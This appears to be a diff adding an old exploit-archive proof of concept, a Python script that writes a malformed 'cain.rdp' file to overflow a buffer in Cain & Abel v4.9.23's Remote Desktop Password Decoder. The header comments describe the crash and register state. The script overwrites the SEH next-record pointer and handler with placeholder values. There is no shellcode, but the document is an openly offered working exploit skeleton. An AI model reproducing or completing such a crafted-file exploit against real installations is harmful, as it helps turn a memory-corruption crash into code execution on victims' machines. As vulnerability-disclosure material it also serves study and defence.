@@ -1,0 +1,38 @@
+# exploit.py
+##########################################################
+# Cain & Abel v4.9.23 (rdp file) Buffer Overflow PoC
+# (other versions may also affected)
+# By:Encrypt3d.M!nd
+#    encrypt3d.blogspot.com
+#
+# Greetz:-=Mizo=-,L!0N,El Mariachi,MiNi SpIder
+##########################################################
+#
+# Description:
+# When Using Remote Desktop Password Decoder in Cain and
+# Importing ".rdp" file contains long Chars(ex:8250 chars)
+# The Program Will crash.And The Following Happen:
+#
+# EAX:41414141  ECX:7C832648  EDX:41414142  EBX:00000000
+# ESP:0012BCD4  EBP:0012BCD4  ESI:001F07A8  EDI:00000001
+# EIP:7E43C201 USER32.7E43C201
+#
+# Access violation When Reading [41414141]
+#
+# And Also The Pointer to next SEH record and SE Handler
+# Will gonna BE Over-wrote
+#
+# This Poc Will Gonna Overwrite the Pointer to next SEH
+# With"42424242" and The SE Handler with"43434343"
+#
+##########################################################
+chars = "A"*8194
+ptns = "B"*4
+shan = "C"*4
+chars2 = "A"*200
+
+exp=open('cain.rdp','w')
+exp.write(chars+ptns+shan+chars2)
+exp.close()
+
+# milw0rm.com [2008-11-30]
